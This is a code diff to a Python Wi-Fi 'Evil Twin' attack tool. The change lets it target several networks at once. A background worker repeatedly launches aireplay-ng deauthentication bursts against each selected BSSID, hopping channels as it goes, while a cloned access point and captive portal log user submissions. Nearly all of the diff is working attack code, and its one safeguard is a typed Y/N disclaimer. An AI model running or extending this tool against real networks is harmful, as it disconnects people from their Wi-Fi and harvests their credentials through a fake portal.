@@ -53,6 +53,8 @@ SUBMISSION_LOCK = threading.Lock()
 LAST_SUBMISSION_IP = None
 
 ATTACK_PROCESS: Optional[subprocess.Popen] = None
+DEAUTH_THREAD: Optional[threading.Thread] = None
+DEAUTH_STOP_EVENT = threading.Event()
 ATTACK_INTERFACE: Optional[str] = None
 AP_INTERFACE: Optional[str] = None
 AP_SSID: Optional[str] = None
@@ -62,6 +64,8 @@ DNSMASQ_PROC: Optional[subprocess.Popen] = None
 DEAUTH_ACTIVE = True
 DEAUTH_FAILURES = 0
 SILENT_INITIAL_DEAUTH_FAILURES = 1
+DEAUTH_BURST_SECONDS = 2.5
+DEAUTH_SWITCH_DELAY_SECONDS = 0.25
 MONITOR_SETTLE_SECONDS = 2.0
 SCAN_BUSY_RETRY_DELAY = 0.8
 SCAN_COMMAND_TIMEOUT = 4.0
@@ -328,7 +332,23 @@ def scan_wireless_networks(
     return sorted_networks
 
 
-def select_network(attack_interface: str, duration_seconds: int) -> Dict[str, Optional[str]]:
+def parse_network_selection(choice: str, max_index: int) -> Optional[List[int]]:
+    if not choice:
+        return None
+    selected: List[int] = []
+    for part in choice.split(","):
+        token = part.strip()
+        if not token or not token.isdigit():
+            return None
+        idx = int(token)
+        if idx < 1 or idx > max_index:
+            return None
+        if idx not in selected:
+            selected.append(idx)
+    return selected if selected else None
+
+
+def select_networks(attack_interface: str, duration_seconds: int) -> List[Dict[str, Optional[str]]]:
     while True:
         networks = scan_wireless_networks(attack_interface, duration_seconds, show_progress=True)
         if not networks:
@@ -347,14 +367,40 @@ def select_network(attack_interface: str, duration_seconds: int) -> Dict[str, Op
             logging.info("  %s %s %s", color_text(label, COLOR_HIGHLIGHT), channel, signal)
 
         choice = input(
-            f"{style('Select network', STYLE_BOLD)} (number, or R to rescan): "
+            f"{style('Select network(s)', STYLE_BOLD)} (number, e.g. 1 or 1,3; R to rescan): "
         ).strip().lower()
         if choice == "r":
             continue
+        selected_indexes = parse_network_selection(choice, len(networks))
+        if selected_indexes:
+            return [networks[idx - 1] for idx in selected_indexes]
+        logging.warning("Invalid selection. Try again.")
+
+
+def choose_ap_ssid(target_networks: List[Dict[str, Optional[str]]]) -> str:
+    options: List[str] = []
+    for target in target_networks:
+        ssid = target.get("ssid") or "<hidden>"
+        if ssid not in options:
+            options.append(ssid)
+
+    if not options:
+        return "<hidden>"
+    if len(options) == 1:
+        return options[0]
+
+    logging.info("")
+    logging.info(style("Choose AP SSID:", STYLE_BOLD))
+    for index, ssid in enumerate(options, start=1):
+        label = f"{index})"
+        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), ssid)
+
+    while True:
+        choice = input(f"{style('Select AP name', STYLE_BOLD)} (number): ").strip()
         if choice.isdigit():
             idx = int(choice)
-            if 1 <= idx <= len(networks):
-                return networks[idx - 1]
+            if 1 <= idx <= len(options):
+                return options[idx - 1]
         logging.warning("Invalid selection. Try again.")
 
 
@@ -415,79 +461,151 @@ def restore_managed_mode(interface: str) -> None:
         pass
 
 
-def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> bool:
-    global ATTACK_PROCESS
-    bssid = target["bssid"]
-    channel = target["channel"]
-    if not bssid:
-        logging.error("Missing target BSSID; cannot start attack.")
-        return False
+def format_target(target: Dict[str, Optional[str]]) -> str:
+    ssid = target.get("ssid") or "<hidden>"
+    bssid = target.get("bssid") or "unknown"
+    channel = target.get("channel")
+    channel_label = f"ch {channel}" if channel else "ch ?"
+    return f"{ssid} ({bssid}, {channel_label})"
 
-    if channel:
-        subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stderr=subprocess.DEVNULL)
 
+def stop_process(process: subprocess.Popen) -> None:
+    if process.poll() is not None:
+        return
     try:
-        ATTACK_PROCESS = subprocess.Popen(
-            ["aireplay-ng", "-0", "0", "-a", bssid, interface],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.PIPE,
-            text=True,
-            preexec_fn=os.setsid,
-        )
-    except FileNotFoundError:
-        logging.error("Required tool 'aireplay-ng' not found!")
-        return False
-    except Exception as exc:
-        logging.error("Failed to start deauth attack: %s", exc)
+        try:
+            pgid = os.getpgid(process.pid)
+        except Exception:
+            pgid = None
+        if pgid is not None:
+            try:
+                os.killpg(pgid, signal.SIGTERM)
+            except Exception:
+                process.terminate()
+        else:
+            process.terminate()
+        process.wait(timeout=3)
+    except subprocess.TimeoutExpired:
+        try:
+            if pgid is not None:
+                os.killpg(pgid, signal.SIGKILL)
+            else:
+                process.kill()
+        except Exception:
+            try:
+                process.kill()
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+
+def deauth_worker(interface: str, targets: List[Dict[str, Optional[str]]]) -> None:
+    global ATTACK_PROCESS, DEAUTH_FAILURES
+    while not DEAUTH_STOP_EVENT.is_set() and DEAUTH_ACTIVE:
+        for target in targets:
+            if DEAUTH_STOP_EVENT.is_set() or not DEAUTH_ACTIVE:
+                break
+
+            bssid = target.get("bssid")
+            channel = target.get("channel")
+            if not bssid:
+                continue
+
+            if channel:
+                subprocess.run(
+                    ["iw", "dev", interface, "set", "channel", str(channel)],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    check=False,
+                )
+
+            try:
+                process = subprocess.Popen(
+                    ["aireplay-ng", "-0", "0", "-a", bssid, interface],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                    preexec_fn=os.setsid,
+                )
+            except FileNotFoundError:
+                logging.error("Required tool 'aireplay-ng' not found!")
+                return
+            except Exception as exc:
+                DEAUTH_FAILURES += 1
+                if DEAUTH_FAILURES > SILENT_INITIAL_DEAUTH_FAILURES:
+                    logging.warning("Failed to start deauth on %s: %s", bssid, exc)
+                time.sleep(1)
+                continue
+
+            ATTACK_PROCESS = process
+            burst_end = time.time() + DEAUTH_BURST_SECONDS
+            early_error = ""
+
+            while time.time() < burst_end:
+                if DEAUTH_STOP_EVENT.is_set() or not DEAUTH_ACTIVE:
+                    break
+                if process.poll() is not None:
+                    if process.stderr:
+                        try:
+                            early_error = process.stderr.read().strip()
+                        except Exception:
+                            early_error = ""
+                    break
+                time.sleep(0.15)
+
+            if process.poll() is None:
+                stop_process(process)
+            else:
+                DEAUTH_FAILURES += 1
+                if DEAUTH_FAILURES > SILENT_INITIAL_DEAUTH_FAILURES:
+                    if early_error:
+                        logging.warning("Deauth exited on %s: %s", bssid, early_error)
+                    else:
+                        logging.warning("Deauth exited on %s.", bssid)
+
+            ATTACK_PROCESS = None
+
+            if len(targets) > 1:
+                time.sleep(DEAUTH_SWITCH_DELAY_SECONDS)
+
+
+def start_deauth_attack(interface: str, targets: List[Dict[str, Optional[str]]]) -> bool:
+    global DEAUTH_THREAD
+
+    valid_targets = [target for target in targets if target.get("bssid")]
+    if not valid_targets:
+        logging.error("No valid BSSID targets; cannot start attack.")
         return False
 
-    time.sleep(1)
-    if ATTACK_PROCESS.poll() is not None:
-        err_output = ATTACK_PROCESS.stderr.read().strip() if ATTACK_PROCESS.stderr else "unknown error"
-        logging.error("Deauth process exited early: %s", err_output or "unknown error")
-        ATTACK_PROCESS = None
+    stop_attack()
+    DEAUTH_STOP_EVENT.clear()
+    DEAUTH_THREAD = threading.Thread(target=deauth_worker, args=(interface, valid_targets), daemon=True)
+    DEAUTH_THREAD.start()
+
+    time.sleep(0.6)
+    if not DEAUTH_THREAD.is_alive():
+        logging.error("Failed to start deauth worker.")
+        DEAUTH_THREAD = None
         return False
 
     return True
 
 
 def stop_attack() -> None:
-    global ATTACK_PROCESS
-    if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
-        try:
-            try:
-                pgid = os.getpgid(ATTACK_PROCESS.pid)
-            except Exception:
-                pgid = None
-            if pgid is not None:
-                try:
-                    os.killpg(pgid, signal.SIGTERM)
-                except Exception:
-                    ATTACK_PROCESS.terminate()
-            else:
-                ATTACK_PROCESS.terminate()
-            ATTACK_PROCESS.wait(timeout=3)
-        except subprocess.TimeoutExpired:
-            try:
-                if pgid is not None:
-                    os.killpg(pgid, signal.SIGKILL)
-                else:
-                    ATTACK_PROCESS.kill()
-            except Exception:
-                try:
-                    ATTACK_PROCESS.kill()
-                except Exception:
-                    pass
-        except Exception:
-            pass
-        try:
-            for _ in range(5):
-                if ATTACK_PROCESS.poll() is not None:
-                    break
-                time.sleep(0.2)
-        except Exception:
-            pass
+    global ATTACK_PROCESS, DEAUTH_THREAD
+    DEAUTH_STOP_EVENT.set()
+
+    if ATTACK_PROCESS:
+        stop_process(ATTACK_PROCESS)
     ATTACK_PROCESS = None
+
+    if DEAUTH_THREAD and DEAUTH_THREAD.is_alive():
+        try:
+            DEAUTH_THREAD.join(timeout=3)
+        except Exception:
+            pass
+    DEAUTH_THREAD = None
 
 
 def shutdown_http_server():
@@ -764,13 +882,16 @@ def cleanup():
     logging.info("Cleanup completed")
 
 
-def disclaimer_confirmed(ssid: str, bssid: str) -> bool:
+def disclaimer_confirmed(ap_ssid: str, targets: List[Dict[str, Optional[str]]]) -> bool:
     logging.info(style("Disclaimer:", STYLE_BOLD))
     logging.info(
         "This tool is intended for authorized testing only. "
         "You must own the equipment and have explicit permission."
     )
-    logging.info("Target SSID: %s (%s)", style(ssid, COLOR_SUCCESS, STYLE_BOLD), bssid)
+    logging.info("AP SSID: %s", style(ap_ssid, COLOR_SUCCESS, STYLE_BOLD))
+    logging.info("Targets:")
+    for target in targets:
+        logging.info("  - %s", format_target(target))
     choice = input(f"{style('Proceed', STYLE_BOLD)}? (Y/N): ").strip().lower()
     return choice == "y"
 
@@ -812,32 +933,31 @@ def run_twins_session() -> bool:
 
     logging.info("")
     input(f"{style('Press Enter', STYLE_BOLD)} to scan networks on {ATTACK_INTERFACE}...")
-    target_network = select_network(ATTACK_INTERFACE, scan_seconds)
+    target_networks = select_networks(ATTACK_INTERFACE, scan_seconds)
     logging.info("")
-    logging.info(
-        "Target selected: %s (%s)",
-        style(target_network["ssid"], COLOR_SUCCESS, STYLE_BOLD),
-        target_network["bssid"],
-    )
+    logging.info(style("Targets selected:", STYLE_BOLD))
+    for target in target_networks:
+        logging.info("  - %s", format_target(target))
 
     ap_candidates = [iface for iface in interfaces if iface != ATTACK_INTERFACE]
     AP_INTERFACE = select_interface(ap_candidates, "Select AP interface")
     subprocess.run(["ip", "link", "set", AP_INTERFACE, "up"], stderr=subprocess.DEVNULL)
 
-    AP_SSID = target_network["ssid"] or "<hidden>"
+    AP_SSID = choose_ap_ssid(target_networks)
     os.makedirs(LOG_DIR, exist_ok=True)
     logging.info("")
     CAPTURE_FILE_PATH = os.path.join(LOG_DIR, sanitize_filename(AP_SSID))
     logging.info("Capturing portal submissions in: %s", CAPTURE_FILE_PATH)
 
     logging.info("")
-    if not disclaimer_confirmed(AP_SSID, target_network["bssid"] or "unknown"):
+    if not disclaimer_confirmed(AP_SSID, target_networks):
         logging.info(color_text("Aborted by user.", COLOR_STOP))
         return False
 
+    primary_channel = target_networks[0].get("channel")
     if not is_monitor_mode(ATTACK_INTERFACE):
         logging.warning("Interface left monitor mode; re-enabling.")
-        if not enable_monitor_mode(ATTACK_INTERFACE, target_network.get("channel")):
+        if not enable_monitor_mode(ATTACK_INTERFACE, primary_channel):
             return False
 
     logging.info("")
@@ -846,7 +966,7 @@ def run_twins_session() -> bool:
         f"{style(AP_SSID, COLOR_SUCCESS, STYLE_BOLD)}..."
     )
 
-    if not start_deauth_attack(ATTACK_INTERFACE, target_network):
+    if not start_deauth_attack(ATTACK_INTERFACE, target_networks):
         return False
 
     if not setup_ap():
@@ -858,7 +978,10 @@ def run_twins_session() -> bool:
     logging.info("")
     logging.info("=" * 50)
     logging.info(f"Evil Twin is {style('running', COLOR_RUNNING, STYLE_BOLD)}!")
-    logging.info(f"Target: {style(AP_SSID, COLOR_SUCCESS, STYLE_BOLD)} ({target_network['bssid']})")
+    logging.info(f"AP SSID: {style(AP_SSID, COLOR_SUCCESS, STYLE_BOLD)}")
+    logging.info("Targets:")
+    for target in target_networks:
+        logging.info("  - %s", format_target(target))
     logging.info("=" * 50)
     logging.info(
         "Press %s to %s",
@@ -873,24 +996,14 @@ def run_twins_session() -> bool:
         while True:
             time.sleep(1)
 
-            if ATTACK_PROCESS and ATTACK_PROCESS.poll() is not None:
-                err_output = ""
-                if ATTACK_PROCESS.stderr:
-                    try:
-                        err_output = ATTACK_PROCESS.stderr.read().strip()
-                    except Exception:
-                        err_output = ""
+            if DEAUTH_ACTIVE and (DEAUTH_THREAD is None or not DEAUTH_THREAD.is_alive()):
                 DEAUTH_FAILURES += 1
                 if DEAUTH_FAILURES > SILENT_INITIAL_DEAUTH_FAILURES:
-                    if err_output:
-                        logging.warning("Deauth process exited unexpectedly: %s", err_output)
-                    else:
-                        logging.warning("Deauth process exited unexpectedly.")
-                if DEAUTH_ACTIVE:
-                    time.sleep(restart_delay)
-                    if not start_deauth_attack(ATTACK_INTERFACE, target_network):
-                        logging.error("Failed to restart deauth attack.")
-                        return False
+                    logging.warning("Deauth worker stopped unexpectedly.")
+                time.sleep(restart_delay)
+                if not start_deauth_attack(ATTACK_INTERFACE, target_networks):
+                    logging.error("Failed to restart deauth attack.")
+                    return False
 
             if SUBMISSION_EVENT.is_set():
                 with SUBMISSION_LOCK:
